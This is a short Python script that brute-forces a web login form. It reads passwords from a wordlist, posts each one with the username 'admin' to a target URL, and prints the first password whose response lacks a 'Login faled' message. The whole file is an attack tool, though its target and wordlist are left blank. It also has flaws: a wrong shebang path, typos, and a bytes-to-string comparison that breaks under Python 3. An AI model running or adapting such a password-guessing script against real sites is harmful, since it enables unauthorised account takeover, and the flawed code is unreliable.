#!/usr/env/python

import requests


target_url = ''
data_dict = {
    "username": "admin",
    "password": "password",
    "Login" : "submit"
}

#response = requests.post(target_url, data_dict)
#print(response.content)

password_list=""
with open(password_list, 'r') as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict['password'] = word
        response = requests.post(target_url, data=data_dict)
        if "Login faled" not in response.content:
            print('[+] Got Password ----> {}'.format(word))
            exit()

print("[+] Reached and of line")
